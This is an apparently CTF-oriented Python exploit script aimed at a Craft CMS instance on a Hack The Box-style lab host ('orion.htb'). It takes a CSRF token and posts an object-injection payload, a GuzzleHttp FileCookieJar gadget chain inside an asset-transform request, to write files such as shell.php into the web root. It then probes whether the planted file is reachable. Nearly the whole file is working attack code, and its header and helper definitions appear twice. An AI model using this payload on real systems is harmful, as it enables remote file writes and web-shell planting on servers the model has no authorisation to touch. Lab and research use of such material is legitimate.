import requests, re, json, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def get_csrf(session):
    r = session.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'csrf-token[^>]+content="([^"]+)"', r.text, re.I)
    return m.group(1) if m else None

import time

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def get_csrf(session):
    r = session.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'csrf-token[^>]+content="([^"]+)"', r.text, re.I)
    return m.group(1) if m else None

def write_file(write_path):
    s = requests.Session()
    tok = get_csrf(s)
    if not tok:
        print("[-] No CSRF token")
        return None

    body = {
        "assetId": 11,
        "handle": {
            "width": 123,
            "height": 123,
            "as session": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "GuzzleHttp\\Cookie\\FileCookieJar",
                "__construct()": [write_path]
            }
        }
    }
    headers = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': tok}
    r = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=60)
    return r

def check_url(url_path):
    try:
        r = requests.get(f'{HOST}{url_path}', headers=HEADERS, timeout=10)
        return r
    except Exception as e:
        return f"Error: {e}"

paths_to_try = [
    '/shell.php',
    '/craft/web/shell.php',
    '/shell.txt',
]

for path in paths_to_try:
    filename = path.rsplit('/', 1)[-1]
    print(f"\n[*] Testing: FileCookieJar -> {path}")
    r = write_file(path)
    print(f"    Response: {r.status_code}, {len(r.text)} bytes")
    if 'PHP Version' in r.text:
        print("    [+] phpinfo in response!")
    elif r.status_code == 200:
        print(f"    First 300: {r.text[:300]}")
    
    time.sleep(1)
    c = check_url('/' + filename)
    if isinstance(c, str):
        print(f"    Check: {c}")
    else:
        print(f"    Check /{filename}: {c.status_code}, {c.text[:300]}")
